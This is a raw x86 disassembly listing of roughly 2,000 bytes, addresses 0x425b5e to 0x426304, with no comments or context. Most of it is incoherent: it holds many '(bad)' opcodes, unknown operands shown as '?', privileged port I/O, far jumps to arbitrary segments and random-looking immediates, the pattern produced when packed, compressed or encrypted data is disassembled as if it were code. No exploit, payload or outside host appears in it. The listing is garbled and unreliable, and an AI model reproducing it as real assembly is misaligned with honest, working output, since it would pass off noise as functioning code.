  425b5e:	push   es
  425b5f:	addr16 std 
  425b61:	jns    0x425ba9
  425b63:	sub    DWORD PTR [ecx-0x63],edi
  425b66:	or     ebp,DWORD PTR [edi]
  425b68:	imul   edi,DWORD PTR [edi],0x1d
  425b6b:	pop    ebp
  425b6c:	jecxz  0x425b2b
  425b6e:	adc    BYTE PTR [edi-0x47],dh
  425b71:	outs   dx,DWORD PTR ds:[esi]
  425b72:	test   DWORD PTR [esi-0x55],edi
  425b75:	pop    ebx
  425b76:	pop    esp
  425b77:	mov    eax,0x841e3dbf
  425b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b7d:	xor    eax,0x4dd4447f
  425b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b83:	mov    dl,0x1f
  425b85:	jns    0x425bea
  425b87:	mov    ?,WORD PTR [ebp+edx*8-0x6a]
  425b8b:	jo     0x425b2b
  425b8d:	mov    ebp,0xc2ce2d1
  425b92:	and    DWORD PTR [esi+0x1a4d27d2],ebx
  425b98:	or     BYTE PTR [eax-0x67],bh
  425b9b:	pop    ss
  425b9c:	(bad)  
  425b9d:	sbb    ah,BYTE PTR [eax+0xab553c2]
  425ba3:	(bad)  
  425ba4:	cli    
  425ba5:	inc    eax
  425ba6:	xchg   ebx,eax
  425ba7:	mov    ds:0x327b9511,eax
  425bac:	in     al,dx
  425bad:	jecxz  0x425c2e
  425baf:	and    eax,0xfde34277
  425bb4:	mov    edi,0xed112851
  425bb9:	jnp    0x425bbc
  425bbb:	mov    ebp,cs
  425bbd:	dec    ebp
  425bbe:	loop   0x425b9e
  425bc0:	aas    
  425bc1:	or     ebx,eax
  425bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bc4:	sbb    BYTE PTR [eax-0x47],ch
  425bc7:	mov    esi,0xa3f50690
  425bcc:	and    bl,BYTE PTR [edi-0x25]
  425bcf:	or     bl,BYTE PTR [edx]
  425bd1:	lahf   
  425bd2:	mov    ebx,0x41123a77
  425bd7:	xor    BYTE PTR [eax+edx*4+0x3161fb56],bh
  425bde:	jl     0x425b67
  425be0:	xchg   bh,bl
  425be2:	ins    BYTE PTR es:[edi],dx
  425be3:	add    eax,0xd507234e
  425be8:	sub    DWORD PTR [ecx],ecx
  425bea:	(bad)  
  425beb:	in     al,0x36
  425bed:	xchg   ecx,eax
  425bee:	cmc    
  425bef:	pop    ss
  425bf0:	div    BYTE PTR [esi+0x4da04f3]
  425bf6:	dec    edi
  425bf7:	jne    0x425bfa
  425bf9:	jmp    0x28b0:0x3bf9d73d
  425c00:	jmp    0x958a:0xd69acc3e
  425c07:	xor    eax,0x2b135376
  425c0c:	xor    DWORD PTR [edx-0x70cc6c79],ebx
  425c12:	adc    BYTE PTR [edi+0x5ec692f1],dl
  425c18:	xchg   ecx,eax
  425c19:	ja     0x425bc5
  425c1b:	jae    0x425bb4
  425c1d:	cld    
  425c1e:	ret    0xf3c6
  425c21:	push   esp
  425c22:	bound  ebp,QWORD PTR [edi]
  425c24:	dec    ebx
  425c25:	jo     0x425c0d
  425c27:	repnz push esi
  425c29:	cmp    DWORD PTR fs:[ecx-0x3d1fb18d],ebp
  425c30:	fbld   TBYTE PTR [eax+0x31]
  425c33:	ds add al,0x7e
  425c36:	sbb    edx,DWORD PTR [esi-0x56]
  425c39:	cs ins BYTE PTR es:[edi],dx
  425c3b:	cmp    al,0x3b
  425c3d:	cli    
  425c3e:	cmp    BYTE PTR [ecx+0x38],ah
  425c41:	cwde   
  425c42:	xchg   DWORD PTR [edi+eax*2],edi
  425c45:	and    eax,0x8c5164d
  425c4a:	inc    ebp
  425c4b:	das    
  425c4c:	icebp  
  425c4d:	jno    0x425c88
  425c4f:	dec    ebx
  425c50:	outs   dx,DWORD PTR ds:[esi]
  425c51:	call   0x20dfa5ff
  425c56:	xchg   esi,eax
  425c57:	stos   BYTE PTR es:[edi],al
  425c58:	cmp    ch,BYTE PTR [eax-0x48]
  425c5b:	mov    bh,0x39
  425c5d:	gs (bad) 
  425c60:	lods   al,BYTE PTR ds:[esi]
  425c61:	adc    eax,0x3cc4f97
  425c66:	or     eax,0x1b0f1b8f
  425c6b:	dec    eax
  425c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c6d:	sub    eax,0xec5db9e7
  425c72:	xchg   ecx,eax
  425c73:	mov    ch,0xf
  425c75:	(bad)  
  425c76:	mov    eax,0x62465142
  425c7b:	dec    esp
  425c7c:	aas    
  425c7d:	or     al,0xf1
  425c7f:	lods   eax,DWORD PTR ds:[esi]
  425c80:	sbb    al,0xd7
  425c82:	clc    
  425c83:	pop    ebp
  425c84:	std    
  425c85:	and    ebx,DWORD PTR [ebx]
  425c87:	adc    DWORD PTR [edi+0x64],esi
  425c8a:	jmp    0xf5ed:0xcabd8074
  425c91:	inc    esp
  425c92:	sbb    eax,0xa8c23a05
  425c97:	aam    0x10
  425c99:	fcmovu st,st(7)
  425c9b:	jb     0x425ccf
  425c9d:	sub    DWORD PTR [ebp+0x5e765ad5],ebp
  425ca3:	lock jle 0x425c89
  425ca6:	mov    ds:0xb9ab4563,al
  425cab:	jbe    0x425c75
  425cad:	mov    al,0xb4
  425caf:	mov    eax,DWORD PTR [esi]
  425cb1:	cmp    eax,0xd5742e93
  425cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cb7:	dec    edi
  425cb8:	call   0xec323670
  425cbd:	dec    edx
  425cbe:	inc    esi
  425cbf:	bound  eax,QWORD PTR [ebx+ebx*1]
  425cc2:	sbb    eax,0x467ccf9
  425cc7:	xchg   ebx,eax
  425cc8:	push   ebp
  425cc9:	stc    
  425cca:	in     al,0x12
  425ccc:	xchg   ebp,eax
  425ccd:	mov    ecx,DWORD PTR [edi]
  425ccf:	push   cs
  425cd0:	test   eax,0xf79ed4cd
  425cd5:	lods   al,BYTE PTR ds:[esi]
  425cd6:	jp     0x425cdc
  425cd8:	call   0xd88d:0xdb61487b
  425cdf:	jae    0x425cd1
  425ce1:	push   ds
  425ce2:	test   eax,0x2bfdc76e
  425ce7:	fnstsw ax
  425ce9:	(bad)  
  425cea:	push   ss
  425ceb:	rcl    DWORD PTR [edi],1
  425ced:	imul   esp,esp,0x50
  425cf0:	mov    al,ds:0xe61c96d8
  425cf5:	jne    0x425cd4
  425cf7:	push   edi
  425cf8:	out    0xa5,al
  425cfa:	xchg   BYTE PTR [ebx],dh
  425cfc:	sbb    al,0x78
  425cfe:	(bad)
  425d01:	ins    DWORD PTR es:[edi],dx
  425d02:	jp     0x425d2a
  425d04:	sub    al,0xcd
  425d06:	xchg   BYTE PTR [ebx],dh
  425d08:	pusha  
  425d09:	mov    ds:0x686e6c94,al
  425d0e:	add    ebp,DWORD PTR [eax+0x2a76d4e3]
  425d14:	inc    ebp
  425d15:	ret    0x8321
  425d18:	mov    ebp,0x81145129
  425d1d:	mul    BYTE PTR [ecx-0x4567a353]
  425d23:	cmp    al,0x88
  425d25:	shr    DWORD PTR [edx+0x6e],0x5e
  425d29:	pop    ds
  425d2a:	nop
  425d2b:	and    al,0x2a
  425d2d:	add    eax,DWORD PTR [esi]
  425d2f:	enter  0x2c46,0x66
  425d33:	push   0xf5291d83
  425d38:	clc    
  425d39:	call   ebx
  425d3b:	xor    al,0x56
  425d3d:	retfw  
  425d3f:	rol    ebp,1
  425d41:	add    BYTE PTR [eax-0x4f35e071],ch
  425d47:	jle    0x425d94
  425d49:	dec    edi
  425d4a:	adc    al,0x4d
  425d4c:	dec    ebp
  425d4d:	aaa    
  425d4e:	and    ebp,0x5e
  425d51:	xor    al,0x76
  425d53:	test   al,0x91
  425d55:	adc    bh,BYTE PTR ds:0x8e837d3e
  425d5b:	rcr    ecx,0xc4
  425d5e:	lock cmp al,0xe7
  425d61:	popa   
  425d62:	pop    edx
  425d63:	les    eax,FWORD PTR [edx]
  425d65:	sahf   
  425d66:	jb     0x425d44
  425d68:	xor    al,BYTE PTR [edi+0x3c]
  425d6b:	xchg   BYTE PTR [eax+0x10845315],bl
  425d71:	sbb    eax,0xbf6e8dd9
  425d76:	lds    esp,FWORD PTR [edi+ecx*4-0xe130d95]
  425d7d:	int3   
  425d7e:	and    ch,ch
  425d80:	repz fisubr WORD PTR [edx+0x11f5912c]
  425d87:	cmp    DWORD PTR [ecx-0x288b6903],edx
  425d8d:	push   ds
  425d8e:	ds sub bl,0x4b
  425d92:	outs   dx,BYTE PTR ds:[esi]
  425d93:	push   ebp
  425d94:	mov    ch,0x7
  425d96:	ret    
  425d97:	call   0xc9883b29
  425d9c:	popa   
  425d9d:	les    ebx,FWORD PTR [ecx+0x5e]
  425da0:	mov    edx,0xc6829fef
  425da5:	push   esi
  425da6:	or     BYTE PTR [edi+eax*4],bl
  425da9:	leave  
  425daa:	in     eax,dx
  425dab:	outs   dx,BYTE PTR ds:[esi]
  425dac:	and    eax,0x7f6217
  425db1:	sub    ecx,edx
  425db3:	adc    eax,0x7986bbd4
  425db8:	mov    al,ds:0x3a9b622c
  425dbd:	pop    esi
  425dbe:	data16 sti 
  425dc0:	(bad)  
  425dc1:	cld    
  425dc2:	and    cl,0xd4
  425dc5:	xlat   BYTE PTR ds:[ebx]
  425dc6:	pop    edx
  425dc7:	shl    DWORD PTR [ecx+0x74],0x99
  425dcb:	mov    ch,0xc2
  425dcd:	jg     0x425d78
  425dcf:	repnz loope 0x425d70
  425dd2:	mov    es,WORD PTR [edx-0xc0edede]
  425dd8:	addr16 data16 push sp
  425ddc:	xor    ecx,DWORD PTR [ebp-0x5727d33d]
  425de2:	fs stc 
  425de4:	inc    esi
  425de5:	xor    al,BYTE PTR [eax]
  425de7:	hlt    
  425de8:	(bad)  
  425de9:	call   0x1c4dda40
  425dee:	mov    eax,0x986fb50b
  425df3:	adc    DWORD PTR [eax+0x1f],edi
  425df6:	rol    BYTE PTR [ebx-0x9],cl
  425df9:	add    DWORD PTR [ebx+esi*1+0x5dadccea],ebp
  425e00:	int3   
  425e01:	jb     0x425dea
  425e03:	push   es
  425e04:	mov    fs,WORD PTR [ebp-0x3b]
  425e07:	lahf   
  425e08:	inc    esp
  425e09:	cmp    eax,0xfc74260a
  425e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e0f:	mov    BYTE PTR [edi-0x63741f22],0x5b
  425e16:	or     eax,0x574ba0c7
  425e1b:	jge    0x425da3
  425e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e1e:	mov    edx,?
  425e20:	xchg   edi,ebp
  425e22:	xchg   esp,eax
  425e23:	nop
  425e24:	cdq    
  425e25:	push   esi
  425e26:	pop    ebx
  425e27:	cmp    dh,ch
  425e29:	xor    eax,0xb6e5633c
  425e2e:	mov    al,0xa3
  425e30:	adc    ah,BYTE PTR [edi+0x6e]
  425e33:	add    BYTE PTR [eax],dh
  425e35:	cmp    eax,0x4e2ea28c
  425e3a:	xor    al,0x65
  425e3c:	jp     0x425e49
  425e3e:	sub    BYTE PTR [ebx+ecx*8],bl
  425e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  425e4a:	inc    edx
  425e4b:	inc    esp
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xee
  425e57:	cwde   
  425e58:	mov    fs,WORD PTR [edx]
  425e5a:	shr    bl,1
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	add    BYTE PTR [esi],0x0
  425e61:	add    bl,al
  425e63:	fst    st(5)
  425e65:	aam    0x8
  425e67:	stos   DWORD PTR es:[edi],eax
  425e68:	xor    al,0xbf
  425e6a:	dec    ecx
  425e6b:	(bad)
  425e6e:	adc    BYTE PTR [edi],dl
  425e70:	les    ebx,FWORD PTR [ecx+0x5ac223ac]
  425e76:	cmp    ebx,DWORD PTR [ebp-0x31de5c18]
  425e7c:	inc    esi
  425e7d:	sub    eax,0xed5acbab
  425e82:	xchg   esi,eax
  425e83:	sahf   
  425e84:	xchg   esp,eax
  425e85:	pop    es
  425e86:	cli    
  425e87:	pop    ss
  425e88:	test   DWORD PTR [ebp+0x4da88297],edx
  425e8e:	dec    ecx
  425e8f:	call   0x710e:0x9c2fde59
  425e96:	push   cs
  425e97:	push   ecx
  425e98:	and    edi,ecx
  425e9a:	dec    esi
  425e9b:	(bad)  
  425e9c:	pop    esi
  425e9d:	(bad)  
  425e9e:	xor    bh,cl
  425ea0:	pusha  
  425ea1:	mov    eax,0xa07bc433
  425ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ea7:	sbb    al,0xd1
  425ea9:	mov    eax,0x3d80d553
  425eae:	dec    ebp
  425eaf:	mov    edx,0xb4b00868
  425eb4:	fist   DWORD PTR [ecx]
  425eb6:	aaa    
  425eb7:	ret    0x7362
  425eba:	adc    DWORD PTR [ebx],0x2ecfb9ce
  425ec0:	sub    eax,0xd175e49f
  425ec5:	jg     0x425e6a
  425ec7:	jbe    0x425ed7
  425ec9:	jge    0x425eab
  425ecb:	dec    ebp
  425ecc:	and    BYTE PTR [ebx],al
  425ece:	adc    al,0x9c
  425ed0:	push   ds
  425ed1:	add    BYTE PTR [ebp+0x4],cl
  425ed4:	ret    
  425ed5:	push   eax
  425ed6:	sti    
  425ed7:	sbb    DWORD PTR [ecx+0x6d2fd926],eax
  425edd:	clc    
  425ede:	in     eax,0xb7
  425ee0:	push   0xffffffc7
  425ee2:	inc    esi
  425ee3:	mov    bl,0xc
  425ee5:	xor    BYTE PTR [edi+0x2aba2eb5],bh
  425eeb:	jbe    0x425f4a
  425eed:	xor    eax,0x58926c8b
  425ef2:	mov    ecx,0xa97eee78
  425ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ef8:	or     BYTE PTR [eax+0x73cae868],ah
  425efe:	repnz adc DWORD PTR [esi+0x6a357667],edi
  425f05:	inc    eax
  425f06:	pop    eax
  425f07:	sti    
  425f08:	aad    0xed
  425f0a:	test   eax,0x894f443c
  425f0f:	ficomp DWORD PTR [ebx]
  425f11:	mov    WORD PTR [ebp+0x11],gs
  425f14:	jno    0x425ed1
  425f16:	(bad)  
  425f17:	ds xor al,0x39
  425f1a:	dec    eax
  425f1b:	inc    ebx
  425f1c:	ins    BYTE PTR es:[edi],dx
  425f1d:	scas   eax,DWORD PTR es:[edi]
  425f1e:	xchg   edx,eax
  425f1f:	cs xor eax,0xaae6d13a
  425f25:	lea    ebp,[ecx+0x6c13d38c]
  425f2b:	js     0x425f6e
  425f2d:	pop    ebx
  425f2e:	lods   al,BYTE PTR ds:[esi]
  425f2f:	xor    cl,BYTE PTR [eax+0xe20a6c1]
  425f35:	movd   mm4,eax
  425f38:	sbb    eax,0xa3230525
  425f3d:	xchg   esi,eax
  425f3e:	shr    BYTE PTR [ecx-0x59],0x39
  425f42:	pop    edx
  425f43:	jb     0x425f8a
  425f45:	push   ebx
  425f46:	div    BYTE PTR [edx-0x3e]
  425f49:	xor    al,0xdc
  425f4b:	inc    eax
  425f4c:	inc    edi
  425f4d:	sbb    DWORD PTR [eax+0x5f31af41],0x83876420
  425f57:	mov    edx,0xe6401a50
  425f5c:	jle    0x425f55
  425f5e:	pop    ebx
  425f5f:	repz xor BYTE PTR [bx+si],bl
  425f63:	or     ebx,ebx
  425f65:	mov    eax,0x217d9598
  425f6a:	adc    eax,0x81146945
  425f6f:	(bad)  
  425f70:	fld    st(6)
  425f72:	xchg   esp,eax
  425f73:	pop    eax
  425f74:	scas   eax,DWORD PTR es:[edi]
  425f75:	leave  
  425f76:	mov    cl,0x86
  425f78:	add    al,0x20
  425f7a:	dec    ebx
  425f7b:	and    edx,ebx
  425f7d:	lods   al,BYTE PTR ds:[esi]
  425f7e:	mov    edi,0xcbe37eef
  425f83:	cmp    al,0x8e
  425f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f86:	out    0x8c,al
  425f88:	ret    
  425f89:	fwait
  425f8a:	mov    dl,BYTE PTR [edi+0x26]
  425f8d:	cmp    al,0xc1
  425f8f:	add    eax,ebp
  425f91:	mov    WORD PTR [ebx],es
  425f93:	dec    edx
  425f94:	sbb    esi,ecx
  425f96:	adc    ebp,0xffffff83
  425f99:	dec    ecx
  425f9a:	fadd   DWORD PTR [eax+0x3d70af6]
  425fa0:	iret   
  425fa1:	sar    cl,cl
  425fa3:	dec    edx
  425fa4:	and    eax,0x64e8a84
  425fa9:	add    bl,dl
  425fab:	arpl   cx,bp
  425fad:	arpl   WORD PTR [edx],ax
  425faf:	add    dh,ah
  425fb1:	adc    bl,BYTE PTR [ecx+0x56dbfd36]
  425fb7:	fcom   DWORD PTR [edi]
  425fb9:	dec    edx
  425fba:	dec    esi
  425fbb:	cmp    eax,0x1c46913d
  425fc0:	jp     0x425fdc
  425fc2:	(bad)  
  425fc3:	xchg   ebp,eax
  425fc4:	pop    edx
  425fc5:	ret    
  425fc6:	mov    dh,0x91
  425fc8:	ja     0x425fd7
  425fca:	ins    BYTE PTR es:[edi],dx
  425fcb:	dec    edx
  425fcc:	cmp    BYTE PTR ds:0xd1441d91,dl
  425fd2:	out    0xc4,al
  425fd4:	mov    ebp,edi
  425fd6:	xchg   ebp,eax
  425fd7:	loop   0x42602a
  425fd9:	ins    BYTE PTR es:[edi],dx
  425fda:	and    edx,DWORD PTR [ebp-0x21cf3e87]
  425fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe1:	loopne 0x425fcf
  425fe3:	jbe    0x426027
  425fe5:	push   edi
  425fe6:	cmp    BYTE PTR [ebx+0x13],cl
  425fe9:	mov    dh,0x21
  425feb:	rcr    BYTE PTR [eax+0x23],1
  425fee:	sub    DWORD PTR [esi+0x4f],0xffffff89
  425ff2:	je     0x426005
  425ff4:	inc    esi
  425ff5:	sub    BYTE PTR [edx*8+0x4da61024],0x88
  425ffd:	jo     0x425f83
  425fff:	jg     0x42603b
  426001:	sbb    DWORD PTR [ecx+edi*8],ecx
  426004:	loopne 0x425fad
  426006:	cs inc ebp
  426008:	neg    BYTE PTR cs:[edi-0xab3057e]
  42600f:	aam    0x8f
  426011:	or     eax,0xdb632212
  426016:	xchg   DWORD PTR [ebx-0x24],edi
  426019:	dec    ebp
  42601a:	inc    edx
  42601b:	mov    dl,0x6e
  42601d:	cmp    BYTE PTR [eax-0x76dbdbb6],cl
  426023:	into   
  426024:	sub    dl,BYTE PTR [edx+eiz*4]
  426027:	sti    
  426028:	cdq    
  426029:	jecxz  0x425fd0
  42602b:	and    ah,BYTE PTR [eax-0x6e]
  42602e:	test   DWORD PTR [eax-0x63dc0be1],edi
  426034:	xor    ah,BYTE PTR [ecx]
  426036:	retf   0x4e99
  426039:	push   ebx
  42603a:	arpl   WORD PTR [edx-0x68],cx
  42603d:	ror    DWORD PTR [edx+0x3aecbf95],0xf6
  426044:	jg     0x425fcd
  426046:	popf   
  426047:	jno    0x425fdd
  426049:	hlt    
  42604a:	or     DWORD PTR [eax],ebx
  42604c:	xor    ecx,DWORD PTR ss:[ebx-0x2f]
  426050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426052:	mov    dl,0xca
  426054:	xor    edi,DWORD PTR [edx+0x3911982e]
  42605a:	bound  esp,QWORD PTR [ecx-0x72]
  42605d:	sbb    BYTE PTR [ebx-0x6b5b3699],ah
  426063:	dec    ebx
  426064:	cmp    BYTE PTR [edi-0x5e0113a6],ch
  42606a:	out    0x87,eax
  42606c:	add    bh,BYTE PTR [ecx+ecx*4+0x6f]
  426070:	outs   dx,BYTE PTR ds:[esi]
  426071:	mov    eax,0x9ae9d4e9
  426076:	icebp  
  426077:	into   
  426078:	ret    0xbd94
  42607b:	test   BYTE PTR [eax-0x10fbf74c],al
  426081:	xchg   ebp,eax
  426082:	fwait
  426083:	sbb    al,0x7e
  426085:	dec    ebx
  426086:	into   
  426087:	mov    esi,0x77f9487c
  42608c:	mov    dh,0xcc
  42608e:	push   0x52c0ecbe
  426093:	adc    cx,bp
  426096:	or     esi,DWORD PTR [esp+ecx*4+0x24]
  42609a:	std    
  42609b:	or     al,0xd
  42609d:	aad    0x87
  42609f:	in     al,0x3c
  4260a1:	mov    ch,0x14
  4260a3:	retf   0xdbbb
  4260a6:	test   al,0x36
  4260a8:	mov    eax,0x34f22b58
  4260ad:	iret   
  4260ae:	cli    
  4260af:	imul   esp,DWORD PTR [edi+0x3d783782],0x62
  4260b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260b7:	popa   
  4260b8:	ficomp DWORD PTR [ecx]
  4260ba:	add    BYTE PTR [esi+0x6245a7bc],bh
  4260c0:	xor    cl,BYTE PTR [edi]
  4260c2:	adc    BYTE PTR [edi-0x4af2a222],dh
  4260c8:	jae    0x426075
  4260ca:	cmp    eax,DWORD PTR [ecx-0x2c86bfea]
  4260d0:	xlat   BYTE PTR ds:[ebx]
  4260d1:	popw   ds
  4260d3:	mov    al,ds:0xa96de53c
  4260d8:	loop   0x426124
  4260da:	out    dx,eax
  4260db:	sar    BYTE PTR [ebx],1
  4260dd:	js     0x42609d
  4260df:	and    al,0xd8
  4260e1:	sbb    al,0xbf
  4260e3:	aad    0x3
  4260e5:	dec    ebp
  4260e6:	cmp    ch,BYTE PTR ds:0x5b3ff793
  4260ec:	std    
  4260ed:	enter  0x7741,0xd8
  4260f1:	xchg   bh,ch
  4260f3:	sub    eax,DWORD PTR [esi+ebx*2+0xf]
  4260f7:	sahf   
  4260f8:	ja     0x4260a2
  4260fa:	or     ch,BYTE PTR fs:[ebx]
  4260fd:	es mov edi,0x8f7271b
  426103:	(bad)  
  426104:	jb     0x426180
  426106:	and    edi,ebx
  426108:	ins    BYTE PTR es:[edi],dx
  426109:	inc    esp
  42610a:	sbb    ebx,DWORD PTR [edx-0x27]
  42610d:	pop    ss
  42610e:	call   0xe853:0x6994896d
  426115:	inc    esi
  426116:	adc    al,dl
  426118:	arpl   WORD PTR [ebp+0x42],cx
  42611b:	sbb    al,0xe1
  42611d:	sbb    al,0xfb
  42611f:	retf   0xf550
  426122:	pop    es
  426123:	rol    BYTE PTR [eax+ecx*2-0x7da52f94],cl
  42612a:	and    ecx,0xffffffbc
  42612d:	int    0x4f
  42612f:	pop    eax
  426130:	sbb    ch,al
  426132:	aaa    
  426133:	pop    es
  426134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426135:	xchg   ebp,eax
  426136:	std    
  426137:	rcl    BYTE PTR [esi+0x1d],0x68
  42613b:	push   edi
  42613c:	sub    eax,0xca60d797
  426141:	loope  0x4260e6
  426143:	jle    0x4261c4
  426145:	inc    ebp
  426146:	mov    esi,0x4b8f7952
  42614b:	mov    al,ds:0xb14e64cd
  426150:	mov    eax,0x909f2452
  426155:	mov    ds:0x34086075,al
  42615a:	mov    ds:0x447bce1f,ax
  426160:	mov    ds:0xc405b5cf,eax
  426165:	push   esp
  426166:	test   al,0x91
  426168:	dec    esp
  426169:	sbb    al,0xb0
  42616b:	dec    eax
  42616c:	pushf  
  42616d:	test   eax,0x2791b6b8
  426172:	cld    
  426173:	pop    ebp
  426174:	test   al,0xe6
  426176:	ins    BYTE PTR es:[edi],dx
  426177:	jl     0x426199
  426179:	aas    
  42617a:	bound  edx,QWORD PTR [ebp-0x6e6a3bf0]
  426180:	dec    ebp
  426181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426182:	int    0x58
  426184:	push   edx
  426185:	or     edi,DWORD PTR [eax+0x1f]
  426188:	fmulp  st(2),st
  42618a:	cmp    bl,bh
  42618c:	in     al,dx
  42618d:	stos   BYTE PTR es:[edi],al
  42618e:	and    esi,DWORD PTR [edx]
  426190:	or     DWORD PTR [edx+ecx*1],ebp
  426193:	sub    al,ah
  426195:	adc    BYTE PTR ds:[edx+0x7738e028],dh
  42619c:	mov    ebx,0xb4ba7d01
  4261a1:	nop
  4261a2:	push   es
  4261a3:	pop    ecx
  4261a4:	add    eax,0xdbebcd1a
  4261a9:	mov    bl,0x72
  4261ab:	cs cdq 
  4261ad:	or     BYTE PTR gs:[esi+0x77d5d165],0x2
  4261b5:	aam    0x55
  4261b7:	xlat   BYTE PTR ds:[ebx]
  4261b8:	stc    
  4261b9:	jb     0x42614e
  4261bb:	add    eax,0x493bfe67
  4261c0:	in     al,dx
  4261c1:	ret    
  4261c2:	xchg   esp,eax
  4261c3:	mov    BYTE PTR [ecx-0x6165d24c],0xba
  4261ca:	in     al,0x1b
  4261cc:	daa    
  4261cd:	inc    ecx
  4261ce:	pop    edi
  4261cf:	mov    eax,0x8eb0bd8e
  4261d4:	push   ebx
  4261d5:	(bad)  
  4261d6:	out    0x81,eax
  4261d8:	push   es
  4261d9:	dec    eax
  4261da:	mov    ch,BYTE PTR [edx]
  4261dc:	inc    ebp
  4261dd:	stc    
  4261de:	inc    edi
  4261df:	ffreep st(1)
  4261e1:	sbb    ebx,DWORD PTR ds:0xb3e9b478
  4261e7:	loop   0x426186
  4261e9:	pop    edi
  4261ea:	dec    edx
  4261eb:	test   edi,esi
  4261ed:	jg     0x4261c0
  4261ef:	int    0xa2
  4261f1:	outs   dx,DWORD PTR ds:[esi]
  4261f2:	test   DWORD PTR ds:0xda0cd313,eax
  4261f8:	(bad)  
  4261f9:	fucom  st(6)
  4261fb:	out    0x6,eax
  4261fd:	dec    edx
  4261fe:	xor    DWORD PTR [ebx+0x51],0x10a0a687
  426205:	sahf   
  426206:	stc    
  426207:	pop    edx
  426208:	mov    ch,0x28
  42620a:	xchg   ecx,eax
  42620b:	pop    es
  42620c:	adc    ch,BYTE PTR [ecx]
  42620e:	(bad)  
  42620f:	enter  0x9c5f,0x40
  426213:	xchg   ecx,eax
  426214:	xor    DWORD PTR [ebx+edx*1-0x795cd9b0],ebp
  42621b:	pop    ds
  42621c:	mov    ch,0x67
  42621e:	inc    esp
  42621f:	ss fmulp st(4),st
  426222:	(bad)  
  426223:	jmp    0x6e8f:0xdbd80c14
  42622a:	rcl    DWORD PTR [esi+edx*1+0x2ead8d87],1
  426231:	dec    edx
  426232:	fdiv   QWORD PTR [ebx-0x79]
  426235:	push   cs
  426236:	(bad)  [edi+0x2e8dc3b6]
  42623c:	cmp    eax,0x62f591b6
  426241:	jbe    0x426225
  426243:	ret    0xab66
  426246:	repz mov cl,0x42
  426249:	mov    ds:0xa5c1a334,eax
  42624e:	push   esp
  42624f:	fcmove st,st(6)
  426251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426252:	imul   ecx,DWORD PTR [ecx+0x74],0xffffff87
  426256:	test   eax,0xa7898d4d
  42625b:	inc    ecx
  42625c:	sbb    bh,BYTE PTR [esi]
  42625e:	push   ss
  42625f:	push   eax
  426260:	xlat   BYTE PTR ds:[ebx]
  426261:	adc    BYTE PTR [edi],bl
  426263:	imul   edx,DWORD PTR [esi+ebp*2],0x45
  426267:	sbb    edx,DWORD PTR [edi]
  426269:	inc    edx
  42626a:	data16 gs int3 
  42626d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42626e:	inc    esi
  42626f:	popf   
  426270:	mov    al,ds:0xe2dc9ac
  426275:	std    
  426276:	xchg   edi,eax
  426277:	outs   dx,BYTE PTR ds:[esi]
  426278:	cmp    edi,DWORD PTR [edi+0x209466e5]
  42627e:	push   cs
  42627f:	std    
  426280:	dec    ecx
  426281:	pop    es
  426282:	ins    BYTE PTR es:[edi],dx
  426283:	retf   
  426284:	jbe    0x426217
  426286:	xor    DWORD PTR [edx-0x2b],edi
  426289:	cs xchg edx,eax
  42628b:	scas   eax,DWORD PTR es:[edi]
  42628c:	cmp    al,0x61
  42628e:	(bad)  [esi+0x64]
  426291:	xor    eax,0x8e2b9aae
  426296:	popf   
  426297:	xor    eax,0x8301db0
  42629c:	push   edx
  42629d:	push   cs
  42629e:	cmp    BYTE PTR [edi+0x4ab4a450],0x97
  4262a5:	xchg   esi,eax
  4262a6:	or     bh,bh
  4262a8:	push   es
  4262a9:	ja     0x42626e
  4262ab:	mov    ds:0x3122b267,al
  4262b0:	cmp    dh,BYTE PTR [ebx+0x16]
  4262b3:	sbb    ebp,DWORD PTR [edi-0x3b]
  4262b6:	data16 std 
  4262b8:	mov    gs,edi
  4262ba:	dec    ecx
  4262bb:	xlat   BYTE PTR ds:[ebx]
  4262bc:	push   eax
  4262bd:	dec    edi
  4262be:	push   cs
  4262bf:	mov    BYTE PTR [ebx],al
  4262c1:	dec    ebp
  4262c2:	test   eax,0xf735482c
  4262c7:	ins    BYTE PTR es:[edi],dx
  4262c8:	inc    ebx
  4262c9:	push   ds
  4262ca:	out    0x1,eax
  4262cc:	lahf   
  4262cd:	test   eax,0x8bba9731
  4262d2:	pop    ss
  4262d3:	pop    edi
  4262d4:	neg    eax
  4262d6:	xlat   BYTE PTR ds:[ebx]
  4262d7:	retf   
  4262d8:	adc    al,0x12
  4262da:	jmp    FWORD PTR [eax+0x6570133e]
  4262e0:	out    dx,eax
  4262e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262e2:	clc    
  4262e3:	push   ecx
  4262e4:	jmp    0x3bdc:0x873dab4a
  4262eb:	jle    0x426332
  4262ed:	in     al,0xf
  4262ef:	sbb    ebp,DWORD PTR [ebp+ecx*4-0x44612b86]
  4262f6:	or     DWORD PTR [esi-0x53e386ed],edi
  4262fc:	aaa    
  4262fd:	jae    0x426308
  4262ff:	dec    edi
  426300:	out    0x17,al
  426302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426303:	dec    ecx
  426304:	aaa    
